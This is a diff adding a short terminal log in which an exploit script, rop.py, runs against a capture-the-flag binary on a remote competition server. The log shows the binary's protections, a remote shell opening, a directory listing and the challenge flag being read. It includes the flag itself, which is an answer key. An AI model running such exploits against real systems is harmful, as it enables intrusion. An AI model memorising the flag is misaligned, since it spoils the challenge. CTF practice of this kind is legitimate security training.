@@ -1,0 +1,22 @@
+$ ./rop.py remote
+[*] '/ctf/ropnop'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[x] Opening connection to hax1.allesctf.net on port 9300
+[x] Opening connection to hax1.allesctf.net on port 9300: Trying 147.75.85.99
+[+] Opening connection to hax1.allesctf.net on port 9300: Done
+[*] Loaded 21 cached gadgets for '/ctf/ropnop'
+[*] Switching to interactive mode
+$ ls
+flag
+meme.jpg
+ropnop
+ynetd
+$ cat flag
+CSCG{s3lf_m0d1fy1ng_c0dez!}
+$ exit
+[*] Got EOF while reading in interactive
+[*] Interrupted
